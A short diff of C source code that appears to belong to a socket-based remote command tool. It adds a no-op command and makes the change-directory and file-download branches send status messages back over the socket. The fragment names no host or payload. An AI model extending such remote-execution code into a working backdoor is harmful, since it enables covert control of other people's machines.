@@ -80,7 +80,12 @@ int main_loop(fileWrapper * file)
 
 					goto close;
 
-				} else {
+				} else if(q == 1) {
+
+					//special command aka do nothing
+					memset(file->buf, 0, BUFSIZE);
+
+				} else{
 
 					if (executeCommand(file) > 0){
 						goto close;
@@ -224,6 +229,10 @@ int processdata(SOCKET s, char cmd, char cmd2)
 					strcpy(buf, "[*] changed dir\n");
 				}
 			}
+			if(sendbuf(s, buf, BUFSIZE) > 0){
+       			 return -1;
+       		 	}
+			return 1;
 
 		}else if(iscommand(cmd) == 2){	// exit command
 			memset(buf, 0, BUFSIZE);
@@ -258,6 +267,10 @@ int processdata(SOCKET s, char cmd, char cmd2)
 					strcpy(buf, "[*] file downloaded\n");
 				}
 			}
+			if(sendbuf(s, buf, BUFSIZE) > 0){
+       			 return -1;
+       		 	}
+			return 1;
 		} else {
 			return -2;
 		}
